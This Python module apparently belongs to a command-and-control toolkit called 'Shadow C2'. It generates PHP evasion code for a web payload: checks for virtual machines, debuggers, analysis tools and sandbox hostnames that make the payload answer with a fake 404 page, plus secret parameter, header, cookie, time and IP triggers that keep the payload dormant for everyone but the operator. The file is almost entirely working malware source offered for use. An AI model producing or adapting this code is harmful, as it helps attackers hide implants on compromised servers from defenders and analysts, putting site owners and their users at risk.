#!/usr/bin/env python3
"""
Shadow C2 — Sandbox / VM / Debugger Detection
Generates PHP code that detects analysis environments and bails silently.
"""

import random


class SandboxDetector:
    """Generate anti-sandbox/VM/debugger PHP code."""

    def generate_php_sandbox_checks(self) -> str:
        """Returns PHP code block with comprehensive sandbox detection."""
        return """
// ===== SANDBOX / VM / DEBUGGER DETECTION =====
$_sandbox_detected = false;

// 1. Check for VM-specific files (Linux)
$_vm_files = array(
    '/sys/class/dmi/id/product_name',
    '/sys/class/dmi/id/sys_vendor',
    '/sys/hypervisor/type',
    '/proc/scsi/scsi',
    '/proc/cpuinfo'
);
foreach($_vm_files as $_vf) {
    if(@is_readable($_vf)) {
        $_content = @file_get_contents($_vf);
        $_vm_signatures = array('VirtualBox', 'VMware', 'QEMU', 'Xen', 'KVM',
            'Microsoft Corporation', 'innotek', 'Bochs', 'Parallels');
        foreach($_vm_signatures as $_sig) {
            if(stripos($_content, $_sig) !== false) {
                $_sandbox_detected = true;
                break 2;
            }
        }
    }
}

// 2. Check MAC address prefixes (VM indicators)
$_mac_prefixes = array(
    '00:0c:29', '00:50:56', '00:05:69',  // VMware
    '08:00:27', '0a:00:27',               // VirtualBox
    '00:1c:42',                            // Parallels
    '00:16:3e',                            // Xen
    '00:15:5d',                            // Hyper-V
);
$_ifaces = @glob('/sys/class/net/*/address');
if($_ifaces) {
    foreach($_ifaces as $_if) {
        $_mac = @trim(@file_get_contents($_if));
        foreach($_mac_prefixes as $_mp) {
            if(stripos($_mac, $_mp) === 0) {
                $_sandbox_detected = true;
                break 2;
            }
        }
    }
}

// 3. Check disk size (sandboxes often have small disks)
if(function_exists('disk_total_space')) {
    $_disk = @disk_total_space('/');
    if($_disk && $_disk < 64424509440) { // < 60GB
        $_sandbox_detected = true;
    }
}

// 4. Check CPU count (sandboxes often have 1-2 CPUs)
if(@is_readable('/proc/cpuinfo')) {
    $_cpuinfo = @file_get_contents('/proc/cpuinfo');
    $_cpu_count = substr_count($_cpuinfo, 'processor');
    if($_cpu_count <= 1) {
        $_sandbox_detected = true;
    }
}

// 5. Check for analysis tools running
$_analysis_procs = array('wireshark', 'tcpdump', 'strace', 'ltrace',
    'gdb', 'ida', 'ollydbg', 'x64dbg', 'immunity', 'procmon',
    'filemon', 'regmon', 'fiddler', 'burp', 'mitmproxy');
if(@is_readable('/proc')) {
    $_procs = @scandir('/proc');
    if($_procs) {
        foreach($_procs as $_p) {
            if(!is_numeric($_p)) continue;
            $_cmdline = @file_get_contents("/proc/{$_p}/cmdline");
            if($_cmdline) {
                foreach($_analysis_procs as $_ap) {
                    if(stripos($_cmdline, $_ap) !== false) {
                        $_sandbox_detected = true;
                        break 2;
                    }
                }
            }
        }
    }
}

// 6. Check for Xdebug (debugging extension)
if(extension_loaded('xdebug')) {
    $_sandbox_detected = true;
}

// 7. Check hostname for sandbox indicators
$_hostname = @gethostname();
$_sandbox_names = array('sandbox', 'malware', 'virus', 'analysis',
    'cuckoo', 'joe', 'hybrid', 'any.run', 'sample', 'test-');
foreach($_sandbox_names as $_sn) {
    if(stripos($_hostname, $_sn) !== false) {
        $_sandbox_detected = true;
        break;
    }
}

// 8. Check /proc/self/status for TracerPid (debugger attached)
if(@is_readable('/proc/self/status')) {
    $_status = @file_get_contents('/proc/self/status');
    if(preg_match('/TracerPid:\\s*(\\d+)/', $_status, $_m)) {
        if(intval($_m[1]) > 0) {
            $_sandbox_detected = true;
        }
    }
}

// If sandbox detected: exit silently with benign output
if($_sandbox_detected) {
    @header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head>';
    echo '<body><h1>Not Found</h1><p>The requested URL was not found.</p></body></html>';
    exit;
}
// ===== END SANDBOX DETECTION =====
"""

    def generate_trigger_conditions(self, trigger_type: str = "param",
                                     trigger_value: str = None) -> str:
        """
        Generate PHP code that only executes payload when specific conditions are met.
        trigger_type: 'param', 'header', 'cookie', 'time', 'ip'
        """
        if trigger_value is None:
            trigger_value = f"x{random.randint(1000, 9999)}"

        triggers = {
            "param": f"""
// Trigger: specific GET/POST parameter required
if(!isset($_REQUEST['{trigger_value}'])) {{
    @header('HTTP/1.1 200 OK');
    echo '<!-- Default page content -->';
    exit;
}}
""",
            "header": f"""
// Trigger: specific HTTP header required
if(!isset($_SERVER['HTTP_X_{trigger_value.upper()}'])) {{
    @header('HTTP/1.1 200 OK');
    echo '';
    exit;
}}
""",
            "cookie": f"""
// Trigger: specific cookie required
if(!isset($_COOKIE['{trigger_value}'])) {{
    @header('HTTP/1.1 200 OK');
    echo '';
    exit;
}}
""",
            "time": f"""
// Trigger: only execute during specific hours (UTC)
$_hour = (int)gmdate('G');
if($_hour < 1 || $_hour > 5) {{ // Only active 01:00-05:00 UTC
    @header('HTTP/1.1 200 OK');
    echo '';
    exit;
}}
""",
            "ip": f"""
// Trigger: only execute for specific IP ranges
$_allowed_ranges = array('10.0.0.', '192.168.', '172.16.');
$_ip_ok = false;
$_remote = $_SERVER['REMOTE_ADDR'];
foreach($_allowed_ranges as $_r) {{
    if(strpos($_remote, $_r) === 0) {{ $_ip_ok = true; break; }}
}}
if(!$_ip_ok) {{
    @header('HTTP/1.1 404 Not Found');
    exit;
}}
""",
        }

        return triggers.get(trigger_type, triggers["param"])

    def generate_all(self, include_sandbox: bool = True,
                     include_trigger: bool = False,
                     trigger_type: str = "param") -> str:
        """Generate complete anti-analysis PHP code block."""
        code = ""
        if include_sandbox:
            code += self.generate_php_sandbox_checks()
        if include_trigger:
            code += self.generate_trigger_conditions(trigger_type)
        return code
